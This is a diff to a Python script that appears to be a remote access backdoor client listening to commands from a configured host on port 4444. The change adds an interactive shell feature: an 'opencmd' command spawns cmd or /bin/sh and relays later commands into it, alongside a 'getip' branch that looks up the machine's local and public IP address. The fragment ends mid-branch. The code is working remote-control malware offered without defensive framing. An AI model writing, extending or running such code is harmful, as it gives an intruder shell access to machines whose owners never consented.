@@ -9,16 +9,31 @@ import json
 
 IP = "127.0.0.1"
 PORT = 4444
+shell = None
 
 def execute_command(cmd):
     """Executes received commands and returns the output."""
+    global shell
     try:
         if cmd.lower() == "opencmd":
             if os.name == "nt":
-                return subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                shell = subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             else:
-                return subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
+                shell = subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            return "Shell started"
+        elif shell:
+            if cmd.lower() == "exit":
+                shell.stdin.write("exit\n")
+                shell.stdin.flush()
+                shell = None
+                return "Shell closed"
+            
+            shell.stdin.write(cmd + "\n")
+            shell.stdin.flush()
+            output = shell.stdout.readline()
+            return output
+    
+            
         elif cmd.lower() == "getip":
             lip = str(socket.gethostbyname(socket.gethostname()))
             res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
